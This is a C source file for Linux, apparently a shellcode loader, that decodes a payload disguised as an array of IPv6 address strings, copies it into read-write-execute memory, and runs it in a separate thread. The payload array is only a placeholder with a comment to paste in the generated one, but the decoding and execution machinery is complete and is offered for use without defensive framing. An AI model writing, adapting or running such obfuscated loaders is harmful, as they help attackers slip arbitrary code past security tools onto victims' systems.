#define _DEFAULT_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define IPV6_BINARY_SIZE 16

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

/*
 * Replace this placeholder with the generated IPv6 array.
 */
static const char* IPv6Shell[] = {
    "::1"
};

#define ELEMENTS_COUNT ((int)(sizeof(IPv6Shell) / sizeof(IPv6Shell[0])))
#define SHELLCODE_SIZE ((size_t)(ELEMENTS_COUNT * IPV6_BINARY_SIZE))

typedef struct {
    unsigned char* buffer;
    size_t size;
    int element_count;
} ShellcodeInfo;

typedef struct {
    const char* input_string;
    struct in6_addr* output_addr;
    char* next_token;
} IPv6ParseContext;

/**
 * @param context 
 * @return 
 */
int parse_ipv6_string(IPv6ParseContext* context) {
    struct in6_addr addr;
    char ipv6_buffer[64] = {0};
    
    strncpy(ipv6_buffer, context->input_string, sizeof(ipv6_buffer) - 1);
    
    if (inet_pton(AF_INET6, ipv6_buffer, &addr) != 1) {
        char alt_buffer[64];
        snprintf(alt_buffer, sizeof(alt_buffer), "%s", ipv6_buffer);
        
        if (inet_pton(AF_INET6, alt_buffer, &addr) != 1) {
            fprintf(stderr, "[!] Failed to convert IPv6 string: %s\n", context->input_string);
            return -1;
        }
    }
    
    memcpy(context->output_addr, &addr, IPV6_BINARY_SIZE);
    
    return 0;
}

/**
 * @param ipv6_strings 
 * @param output_buffer
 * @param element_count 
 * @return 
 */
int decode_ipv6_fuscation(const char* ipv6_strings[], unsigned char* output_buffer, int element_count) {
    int offset = 0;
    IPv6ParseContext context;
    
    for (int i = 0; i < element_count; i++) {
        context.input_string = ipv6_strings[i];
        context.output_addr = (struct in6_addr*)(output_buffer + offset);
        context.next_token = NULL;
        
        if (parse_ipv6_string(&context) != 0) {
            fprintf(stderr, "[!] Failed to decode IPv6 at index %d\n", i);
            return -1;
        }
        
        offset += IPV6_BINARY_SIZE;
    }
    
    return 0;
}

/**
 * @param size 
 * @return 
 */
void* allocate_executable_memory(size_t size) {
    void* buffer = mmap(NULL, size, 
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, 
                        -1, 0);
    
    if (buffer == MAP_FAILED) {
        perror("[!] mmap failed");
        return NULL;
    }
    
    return buffer;
}


void* execute_shellcode(void* arg) {
    void (*shellcode)() = (void(*)())arg;
    shellcode();
    return NULL;
}


void free_executable_memory(void* buffer, size_t size) {
    if (buffer != NULL && buffer != MAP_FAILED) {
        munmap(buffer, size);
    }
}


void print_shellcode_info(const ShellcodeInfo* info, void* exec_buffer) {
    printf("[i] Shellcode Information:\n");
    printf("    ├─ Size: %zu bytes\n", info->size);
    printf("    ├─ Elements: %d IPv6 addresses\n", info->element_count);
    printf("    ├─ Bytes per element: %d\n", IPV6_BINARY_SIZE);
    printf("    └─ Total decoded size: %zu bytes\n", (size_t)info->element_count * IPV6_BINARY_SIZE);
    
    printf("\n[+] Memory Information:\n");
    printf("    ├─ Executable buffer: %p\n", exec_buffer);
    printf("    └─ Protection: READ | WRITE | EXECUTE\n");
}


int validate_shellcode_size(const ShellcodeInfo* info) {
    size_t calculated_size = info->element_count * IPV6_BINARY_SIZE;
    
    if (calculated_size != info->size) {
        fprintf(stderr, "[!] Size mismatch: expected %zu, got %zu\n", 
                info->size, calculated_size);
        return -1;
    }
    
    return 0;
}


void debug_hex_dump(const unsigned char* buffer, size_t size, size_t bytes_per_line) {
    printf("\n[*] Decoded Shellcode Hex Dump:\n");
    
    for (size_t i = 0; i < size; i += bytes_per_line) {
        printf("    0x%04zx: ", i);
        
        for (size_t j = 0; j < bytes_per_line && (i + j) < size; j++) {
            printf("%02x ", buffer[i + j]);
        }
        printf("\n");
    }
}

int main(int argc, char* argv[]) {
    ShellcodeInfo shellcode = {
        .buffer = NULL,
        .size = SHELLCODE_SIZE,
        .element_count = ELEMENTS_COUNT
    };
    
    void* exec_buffer = NULL;
    pthread_t thread_id;
    int result = 0;
    int debug_mode = 0;
    
    if (argc > 1 && strcmp(argv[1], "--debug") == 0) {
        debug_mode = 1;
    }
    
    printf("[*] IPv6 Shellcode Decoder for Linux\n");
    printf("[*] =================================\n\n");
    
    if (validate_shellcode_size(&shellcode) != 0) {
        return -1;
    }
    
    shellcode.buffer = (unsigned char*)malloc(shellcode.size);
    if (!shellcode.buffer) {
        perror("[!] Failed to allocate temporary buffer");
        return -1;
    }
    
    printf("[1/4] Decoding IPv6 shellcode...\n");
    if (decode_ipv6_fuscation(IPv6Shell, shellcode.buffer, shellcode.element_count) != 0) {
        fprintf(stderr, "[!] Failed to decode shellcode\n");
        result = -1;
        goto cleanup;
    }
    printf("[+] Shellcode decoded successfully\n");
    
    if (debug_mode) {
        debug_hex_dump(shellcode.buffer, shellcode.size, 16);
    }
    
    printf("\n[2/4] Allocating executable memory...\n");
    exec_buffer = allocate_executable_memory(shellcode.size);
    if (!exec_buffer) {
        result = -1;
        goto cleanup;
    }
    printf("[+] Memory allocated at %p\n", exec_buffer);
    
    printf("\n[3/4] Copying shellcode to executable buffer...\n");
    memcpy(exec_buffer, shellcode.buffer, shellcode.size);
    printf("[+] Shellcode copied (%zu bytes)\n", shellcode.size);
    
    print_shellcode_info(&shellcode, exec_buffer);
    
    printf("\n[4/4] Creating execution thread...\n");
    if (pthread_create(&thread_id, NULL, execute_shellcode, exec_buffer) != 0) {
        perror("[!] Failed to create thread");
        result = -1;
        goto cleanup;
    }
    printf("[+] Shellcode execution thread created (ID: %lu)\n", thread_id);
    
    printf("\n[+] Shellcode is now running\n");
    printf("[+] Press Enter to exit and clean up...\n");
    getchar();
    
    pthread_join(thread_id, NULL);
    
cleanup:
    printf("\n[*] Cleaning up resources...\n");
    
    if (shellcode.buffer) {
        free(shellcode.buffer);
        printf("[*] Temporary buffer freed\n");
    }
    
    if (exec_buffer) {
        free_executable_memory(exec_buffer, shellcode.size);
        printf("[*] Executable memory freed\n");
    }
    
    printf("[*] Cleanup complete\n");
    
    if (result == 0) {
        printf("\n[✓] Program terminated successfully\n");
    } else {
        printf("\n[✗] Program terminated with errors\n");
    }
    
    return result;
}
